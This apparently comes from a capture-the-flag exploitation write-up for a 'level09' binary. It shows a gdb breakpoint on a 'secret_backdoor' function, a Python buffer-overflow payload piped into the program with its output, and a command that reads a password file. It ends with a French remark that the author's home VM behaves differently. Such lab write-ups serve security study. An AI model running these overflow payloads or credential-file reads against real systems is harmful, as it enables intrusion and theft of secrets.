(gdb) b secret_backdoor 
Breakpoint 1 at 0x555555554890

(python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)') | ./level09

```sh
$ (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
```

j'ai un résultat différent dans ma vm chez moi, très bizarre